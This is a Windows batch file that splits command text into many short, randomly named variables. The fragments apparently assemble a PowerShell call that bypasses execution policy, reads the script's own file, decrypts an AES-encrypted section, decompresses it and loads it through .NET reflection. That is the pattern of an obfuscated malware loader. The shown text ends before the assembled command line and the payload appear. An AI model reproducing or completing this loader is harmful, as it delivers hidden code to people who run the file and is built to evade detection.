@echo off
set "DRdczTMllK=rS"
set "aFNUjIcCOk=32"
set "OAlECGylxN=do"
set "EVGyzbcAPn=\W"
set "fMmTCSxKDi=py"
set "AVAPRREpCr=:\"
set "vLRVEDgUWT=po"
set "ghoJirllso=\v"
set "VnguOjmwbL=ow"
set "trRLTvCbdZ=he"
set "tWqkapGrjV=nd"
set "bqSjISxaup=ll"
set "htXHCKrHiV=1."
set "guevVSnNto=co"
set "JROMmZWZGY= C"
set "OjuPuRkjDL=ws"
set "dgaFBVEhQu=in"
set "eVMtveKcVT=we"
set "jooRhTEisn=Po"
set "lmfGvQMiZY=st"
set "zeqHbEewGo=y "
set "oihlePoaEo=s\"
set "grgHuffDTD= /"
set "MRIdNlPefk=em"
set "BQRywPBbRV=rs"
set "MmkEFDEqPC=Sy"
set "bedbAXhpog=xe"
set "SrFmSnYTtG=0\"
set "UOmvfETszO=.e"
set "eTCNiYnJOc=Wi"
set "pZbiBItkGY=we"
set "DwLoFTqxKj=ll"
set "LuEelAltwJ=he"
set "BodQcbRBYt= %~dp0"
set "qiZgNPUeod=cd"
set "esRHASoYqY=yj ="
set "shXORmmCIg= if "
set "PVLsZSgdkG=($UG"
set "QzNrNoXqgy=ijMA"
set "hfMGTYATRm===')"
set "wYPfXITQhj=fore"
set "ggxOhBjEPQ=.Cry"
set "ZnCgKKLWeG=tsWi"
set "EylAhjoRXm=y.Ci"
set "elkhFgEMEg=raph"
set "yCFNbuwKyb=:('g"
set "PJswgAOKqi=.Dis"
set "DXYFBeszhP=PKCS"
set "aZCDPmvHzr=IKyj"
set "HAtUFFqoUu=Y = "
set "KyNvtUqOBb='oPV"
set "ondfUNJgld=New-"
set "tRaaXvcXnN=k; }"
set "QALenfoJNx=d;$q"
set "TsFgXDeFTR=.Cry"
set "OmlTFNadQs=AijM"
set "JBbUkRFXdU=ress"
set "vWdARFUKIl='')("
set "hDQEGWLGfk=cn.D"
set "xwGjZRwWIc=A = "
set "yfjkfWNUKS=pher"
set "iSqFonQqnL=.Com"
set "mMYZhWIDKZ=saBm"
set "pgMJIaNwwJ=yj);"
set "BCwFIncMTk=bstr"
set "cqZdBMSuuS='gni"
set "weEvTMzeQm=ewLi"
set "YnDBvzmjFS=();$"
set "OpCsJFGiPK=$mIK"
set "MYSEHibIOT=oArr"
set "YyTLWVNQDk=TtJ."
set "qHAuygsKEL=em.I"
set "MMLqdbCRhA=ay()"
set "yNViRZAHUv=Stre"
set "wyZgQBncJH=tS46"
set "CSMVDDbqsA=ck($"
set "vjOjqIhnEr=;$zz"
set "vtlZOQNHZc=AijM"
set "BvofGuqAUt=Syst"
set "VfkNKLYGzD=[Env"
set "iaTNqoPufO=m(, "
set "NQJnLvDTlS=UGLR"
set "ffxldhGgSm=.Sec"
set "QlpowyztQn=rity"
set "UkjESxcxBe=($UG"
set "diaxUZWtvG=em.C"
set "fQrFvmPlmz=Tmet"
set "ZxEeZKdaEu=daeR"
set "RrOwmvSnHW=orF'"
set "OvMdfLasFm=('da"
set "ixeFxhAIPn=flec"
set "gtwwXHGjhm=;$Lz"
set "sFRlIppuPR=bypa"
set "arWiHloGUL=('%~f0'"
set "LbIcHoVYiv=th('"
set "KjGyLiakzK=NRZY"
set "SvgLWOygnO=.Con"
set "UUjvnAvHwX=[Sys"
